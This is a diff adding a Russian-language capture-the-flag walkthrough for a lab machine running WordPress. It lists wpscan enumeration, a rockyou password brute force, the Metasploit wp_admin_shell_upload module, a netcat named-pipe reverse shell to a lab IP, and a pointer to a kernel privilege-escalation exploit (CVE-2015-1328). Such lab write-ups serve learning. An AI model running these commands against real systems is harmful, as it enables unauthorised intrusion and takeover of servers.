@@ -1,0 +1,32 @@
+довольно быстро нашлась директория /1010101, а в ней /wordpress
+остальное дело техники
+    wpscan --url http://192.168.226.166/1010101/wordpress --enumerate u
+        admin
+
+    wpscan --url http://192.168.226.166/1010101/wordpress --enumerate ap --plugins-detection aggressive --plugins-version-detection aggressive
+        ничего не находим
+    
+    wpscan --url http://derpnstink.local/weblog -U user.txt -P /root/Downloads/rockyou.txt
+        Password@123
+
+    и тут возникла др проблема, всякая ссылка на этом сайте ссылается на 127.0.0.1 и следовательно при вводе пароля и логина тож туда перенапрявлется
+    а при перехвате burp и изменении запроса не получает ответа
+
+тут нам поможет metasploite
+    search wordpress
+    use exploit/unix/webapp/wp_admin_shell_upload
+        set rhosts 192.168.226.166
+        set username admin
+        set password Password@123
+        set targeturi /1010101/wordpress/
+        run
+            shell
+                rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.226.135 1234 >/tmp/f
+
+далее нужно проэксплуатировать ядро,оно уязвимо 3.13.0
+CVE-2015-1328
+https://www.exploit-db.com/exploits/37292
+
+ничего сложного не было
+было интересно найти папку 1010101, она изначально была зашифрована в комментарии целых 2 раза, так что при первой расшифровке я про нее забыла, и ашла лишь после того как все остальное было попробовано и не сработало
+и еще было интересно загружать shell через msf, при работе с сайтом wordpress это заняло бы больше времени
